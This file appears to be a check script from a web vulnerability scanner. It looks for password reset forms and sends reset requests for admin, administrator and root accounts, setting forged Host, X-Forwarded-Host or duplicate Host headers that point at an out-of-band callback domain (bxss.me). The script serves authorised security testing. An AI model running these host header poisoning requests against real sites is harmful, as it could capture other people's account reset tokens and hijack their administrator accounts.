#include constants.inc;
#include helpers.inc;
var targetUrl = new TURL(scanURL.url);
var scheme = getCurrentScheme();
var debug = false;
targetUrl.path = scheme.path;
targetUrl.getVar = "";
var interestingInputNames	=	["login", "email", "mail", "user", "logon"];
var interestingURLKeywords	=	["reset", "password", "forget", "forgot", "lost", "remind", "recover", "forgotten", "sendpwd", "lostPassword", "reset_pwd", "lostpw", "recpass", "getpassword", "PasswordReset", "emailpwd", "sendpassword", "reminder", "password"];
var userNames = [];
var baseDomain = getBaseDomain(scanURL);
userNames.push('admin');
userNames.push('admin@' + baseDomain);
userNames.push('administrator');
userNames.push('administrator@' + baseDomain);
userNames.push('root');
userNames.push('root@' + baseDomain);
// **************************************************************************************
function interestingInput(inputName) {
	if (inputName) 
	for (var i=0; i<interestingInputNames.length; i++) 
      {
				if (inputName.toLowerCase().indexOf(interestingInputNames[i]) != -1) 
					return true;
      }	
	
	return false;
}	
// **************************************************************************************
function interestingURL(URL) {
	if (URL) 
	for (var i=0; i<interestingURLKeywords.length; i++) 
      {
				if (URL.toLowerCase().indexOf(interestingURLKeywords[i]) != -1) 
					return true;
      }	
	
	return false;
}	
{ // class for testing for Host Based Attack 
	// **************************************************************************************
	function classHBA(scheme, inputIndex){
	
		this.scheme = scheme;
		this.inputIndex = inputIndex;
		this.variations = scheme.selectVariationsForInput(inputIndex);
		this.currentVariation = 0;
		this.foundVulnOnVariation = false;
		this.lastJob = null;
	}
	
	// **************************************************************************************
	classHBA.prototype.request = function(value, host, forwardedHost)
	{	
		if (debug) trace("testing : " + value + "," + host + "," + forwardedHost);
		
		this.scheme.loadVariation(this.variations.item(this.currentVariation));
		this.scheme.setInputValue(this.inputIndex, value);
		this.lastJob = new THTTPJob();
		this.lastJob.autoHostHeader = false;
		this.lastJob.url = targetUrl;
			
		scheme.populateRequest(this.lastJob);
		this.lastJob.host = scanIP;
		this.lastJob.Request.addHeader('Host', host, false);
		this.lastJob.Request.addHeader('X-Forwarded-Host', forwardedHost, false);
 
		this.lastJob.execute();
        
		return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003))); 
	}	
	
	// **************************************************************************************
	classHBA.prototype.request2hosts = function(value, host1, host2)
	{	
		if (debug) trace("testing : " + value + "," + host1 + "," + host2);
		
		this.scheme.loadVariation(this.variations.item(this.currentVariation));
		this.scheme.setInputValue(this.inputIndex, value);
		this.lastJob = new THTTPJob();
		this.lastJob.autoHostHeader = false;
		this.lastJob.url = targetUrl;
			
		scheme.populateRequest(this.lastJob);
		this.lastJob.host = scanIP;
		this.lastJob.Request.addHeader('Host', host1, false);
		this.lastJob.Request.addHeader('Host', host2, false);
 
		this.lastJob.execute();
        
		return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003))); 
	}	
	
	// **************************************************************************************
	classHBA.prototype.interestingScheme = function()
	{	
		this.scheme.loadVariation(this.variations.item(this.currentVariation));
		this.scheme.setInputValue(this.inputIndex, '');
		this.lastJob = new THTTPJob();
		this.lastJob.url = targetUrl;    
		scheme.populateRequest(this.lastJob);
		if (
				this.lastJob.url && 
				interestingURL(this.lastJob.url.url)
			) return this.lastJob.url.url;
		
		return false;
	}	
	
	// **************************************************************************************
	classHBA.prototype.startTesting = function()
	{
		for (var i=0; i < this.variations.count; i++) 
		{
			this.currentVariation = i;
					
			var schemeUrl = this.interestingScheme();
		
			if (schemeUrl) {
				if (debug) trace("interesting scheme: " + schemeUrl);
				
				// test all usernames
				for (var j=0; j<userNames.length; j++) {
					
					// test 1
					var reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), 20);
					if (reqId) {
						var reqIdParts = reqId.split("-");
						var reqScanId = reqIdParts[0];						
		        		var reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1,6);
						var hostName = bxss_userId + "." + reqId + "." + reqScanId + "." + reqHash + ".bxss.me";
					
						this.request(userNames[j], hostName, scanURL.host);
					}
					
					// test 2
					reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), 21);
					if (reqId) {
						var reqIdParts = reqId.split("-");
						var reqScanId = reqIdParts[0];						
		        		var reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1,6);
						var hostName = bxss_userId + "." + reqId + "." + reqScanId + "." + reqHash + ".bxss.me";
						
						this.request(userNames[j], scanURL.host, hostName);
					}					
					
					// test 3
					reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), 21);
					if (reqId) {
						var reqIdParts = reqId.split("-");
						var reqScanId = reqIdParts[0];						
		        		var reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1,6);
						var hostName = bxss_userId + "." + reqId + "." + reqScanId + "." + reqHash + ".bxss.me";
						
						this.request2hosts(userNames[j], scanURL.host, hostName);
					}					
				}
			}
		}
	}	
}
// **************************************************************************************
// main entry point
var bxss_enabled = getGlobalValue('blindxss.enabled');
var bxss_userId = getGlobalValue('blindxss.userid');
var bxss_url = getGlobalValue('blindxss.url');
var HBAPWCount = getGlobalValue('HBAPWCount');
if (!HBAPWCount) HBAPWCount = 1
else HBAPWCount = HBAPWCount + 1;
// don't run more than 10 times
if (HBAPWCount < 10) {
	SetGlobalValue("HBAPWCount", HBAPWCount, true);
	
	// don't run unless blind xss is enabled and have a valid userid and url
	if (bxss_enabled == 1 && bxss_userId && bxss_url) {
		for (var i=0;i<scheme.inputCount; i++)
		{
			var inputName = scheme.getInputName(i);
			if (interestingInput(inputName)) {
				if (debug) trace("interesting input: " + inputName);
				
				var tester = new classHBA(scheme, i);
				tester.startTesting();
				ScriptProgress(ComputeProgress(i, scheme.inputCount));
				tester = null;
			}
		}
	}
}